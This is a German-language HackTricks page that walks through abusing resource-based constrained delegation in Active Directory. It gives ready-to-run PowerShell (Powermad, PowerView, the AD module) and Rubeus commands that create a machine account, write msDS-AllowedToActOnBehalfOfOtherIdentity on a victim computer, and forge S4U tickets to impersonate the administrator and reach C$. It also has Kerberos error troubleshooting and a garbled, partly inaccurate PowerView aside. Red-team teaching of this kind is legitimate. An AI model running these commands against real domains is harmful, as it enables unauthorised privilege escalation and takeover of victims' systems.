# Ressourcenbasierte eingeschränkte Delegation

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## Grundlagen der ressourcenbasierten eingeschränkten Delegation

Dies ist ähnlich wie die grundlegende [eingeschränkte Delegation](constrained-delegation.md), aber anstatt Berechtigungen an ein **Objekt** zu geben, um sich als beliebiger Benutzer gegen einen Dienst zu **verkörpern**, legt die ressourcenbasierte eingeschränkte Delegation fest, **wer in der Lage ist, sich als beliebiger Benutzer gegen das Objekt zu verkörpern**.

In diesem Fall hat das eingeschränkte Objekt ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ mit dem Namen des Benutzers, der sich als beliebiger anderer Benutzer gegen das Objekt verkörpern kann.

Ein weiterer wichtiger Unterschied dieser eingeschränkten Delegation zu den anderen Delegationen besteht darin, dass jeder Benutzer mit **Schreibberechtigungen über ein Maschinenkonto** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) das _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ setzen kann (Bei den anderen Formen der Delegation benötigten Sie Domänenadministratorrechte).

### Neue Konzepte

In der eingeschränkten Delegation wurde gesagt, dass die **`TrustedToAuthForDelegation`**-Flagge im _userAccountControl_-Wert des Benutzers benötigt wird, um eine **S4U2Self** durchzuführen. Aber das ist nicht ganz richtig.\
Die Realität ist, dass Sie auch ohne diesen Wert eine **S4U2Self** gegen jeden Benutzer durchführen können, wenn Sie ein **Dienst** sind (eine SPN haben). Wenn Sie jedoch **`TrustedToAuthForDelegation`** haben, wird der zurückgegebene TGS **weiterleitbar** sein, und wenn Sie diese Flagge **nicht haben**, wird der zurückgegebene TGS **nicht** weiterleitbar sein.

Wenn der in **S4U2Proxy** verwendete **TGS** **NICHT weiterleitbar** ist, funktioniert ein Versuch, eine **grundlegende eingeschränkte Delegation** auszunutzen, **nicht**. Wenn Sie jedoch versuchen, eine **ressourcenbasierte eingeschränkte Delegation auszunutzen, funktioniert es** (das ist keine Sicherheitslücke, sondern ein Feature, anscheinend).

### Angriffsstruktur

> Wenn Sie **Schreibberechtigungen** über ein **Computer**-Konto haben, können Sie **privilegierten Zugriff** auf diese Maschine erlangen.

Angenommen, der Angreifer hat bereits **Schreibberechtigungen** über den Computer des Opfers.

1. Der Angreifer **kompromittiert** ein Konto, das eine **SPN** hat, oder **erstellt ein solches** ("Service A"). Beachten Sie, dass **jeder** _Admin-Benutzer_ ohne weitere spezielle Berechtigungen bis zu 10 **Computerobjekte (**_**MachineAccountQuota**_**)** erstellen und ihnen eine SPN zuweisen kann. Der Angreifer kann also einfach ein Computerobjekt erstellen und eine SPN setzen.
2. Der Angreifer **missbraucht seine SCHREIB-Berechtigung** über den Computer des Opfers (ServiceB), um eine **ressourcenbasierte eingeschränkte Delegation zu konfigurieren, die ServiceA ermöglicht, sich als beliebiger Benutzer gegen den Opfercomputer** (ServiceB) zu verkörpern.
3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Service A auf Service B für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
1. S4U2Self (vom kompromittierten/erstellten Konto mit SPN): Fordern Sie ein **TGS des Administrators für mich** an (nicht weiterleitbar).
2. S4U2Proxy: Verwenden Sie das **nicht weiterleitbare TGS** aus dem vorherigen Schritt, um ein **TGS** vom **Administrator** zum **Opferhost** anzufordern.
3. Selbst wenn Sie ein nicht weiterleitbares TGS verwenden, funktioniert es, da Sie eine ressourcenbasierte eingeschränkte Delegation ausnutzen.
4. Der Angreifer kann das Ticket weitergeben und den Benutzer **verkörpern**, um Zugriff auf den Opferdienst B zu erhalten.

Um die _**MachineAccountQuota**_ der Domäne zu überprüfen, können Sie Folgendes verwenden:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Angriff

### Erstellen eines Computerobjekts

Sie können ein Computerobjekt innerhalb der Domäne mithilfe von [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurieren der Ressourcenbasierten Eingeschränkten Delegation

**Mit dem activedirectory PowerShell-Modul**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Verwendung von Powerview**

Powerview ist ein leistungsstolles PowerShell-Modul, das bei der Durchführung von Active Directory-Angriffen hilfreich ist. Es bietet verschiedene Funktionen, um Informationen über Domänen, Benutzer, Gruppen und Computer abzurufen.

Um Powerview zu verwenden, müssen Sie es zuerst in Ihre PowerShell-Sitzung importieren. Verwenden Sie dazu den Befehl `Import-Module PowerView`.

Sobald das Modul importiert ist, können Sie verschiedene Cmdlets verwenden, um Informationen abzurufen. Einige nützliche Cmdlets sind:

- `Get-Domain`: Ruft Informationen über die Domäne ab.
- `Get-DomainUser`: Ruft Informationen über Benutzer in der Domäne ab.
- `Get-DomainGroup`: Ruft Informationen über Gruppen in der Domäne ab.
- `Get-DomainComputer`: Ruft Informationen über Computer in der Domäne ab.

Sie können auch spezifischere Informationen abrufen, indem Sie Filter verwenden. Zum Beispiel können Sie den Befehl `Get-DomainUser -Filter {admincount -eq 1}` verwenden, um alle Benutzer mit erhöhten Rechten abzurufen.

Powerview bietet auch Funktionen zum Durchführen von Angriffen wie zum Beispiel das Sammeln von Hashes, das Erstellen von Golden Tickets und das Ausnutzen von Kerberos-Schwachstellen.

Es ist wichtig zu beachten, dass Powerview administrative Rechte erfordert, um auf Active Directory zuzugreifen. Stellen Sie sicher, dass Sie über die erforderlichen Berechtigungen verfügen, bevor Sie es verwenden.
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Durchführung eines vollständigen S4U-Angriffs

Zunächst haben wir das neue Computerobjekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dies druckt die RC4- und AES-Hashes für dieses Konto aus.\
Nun kann der Angriff durchgeführt werden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Sie können mehr Tickets generieren, indem Sie einmal den `/altservice`-Parameter von Rubeus verwenden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Beachten Sie, dass Benutzer ein Attribut namens "**Kann nicht weitergeleitet werden**" haben. Wenn ein Benutzer dieses Attribut auf True hat, können Sie ihn nicht imitieren. Diese Eigenschaft kann in Bloodhound eingesehen werden.
{% endhint %}

### Zugriff

Der letzte Befehl führt den **kompletten S4U-Angriff durch und injiziert den TGS** von Administrator in den Opfer-Host im **Speicher**.\
In diesem Beispiel wurde ein TGS für den **CIFS-Dienst von Administrator angefordert**, sodass Sie auf **C$** zugreifen können:
```bash
ls \\victim.domain.local\C$
```
### Missbrauch verschiedener Diensttickets

Erfahren Sie mehr über die [**verfügbaren Diensttickets hier**](silver-ticket.md#verfügbare-dienste).

## Kerberos-Fehler

* **`KDC_ERR_ETYPE_NOTSUPP`**: Dies bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet wird und Sie nur den RC4-Hash bereitstellen. Geben Sie Rubeus mindestens den AES256-Hash an (oder geben Sie ihm einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Dies bedeutet, dass die Zeit des aktuellen Computers von der des DC abweicht und Kerberos nicht ordnungsgemäß funktioniert.
* **`preauth_failed`**: Dies bedeutet, dass der angegebene Benutzername + Hashes nicht zum Anmelden funktionieren. Möglicherweise haben Sie vergessen, das "$" im Benutzernamen zu setzen, wenn Sie die Hashes generieren (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Dies kann bedeuten:
* Der Benutzer, den Sie zu imitieren versuchen, kann nicht auf den gewünschten Dienst zugreifen (weil Sie ihn nicht imitieren können oder weil er nicht genügend Berechtigungen hat)
* Der angeforderte Dienst existiert nicht (wenn Sie ein Ticket für WinRM anfordern, aber WinRM nicht ausgeführt wird)
* Der erstellte Fakecomputer hat seine Berechtigungen über den verwundbaren Server verloren und Sie müssen sie zurückgeben.

## Referenzen

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>Erlernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
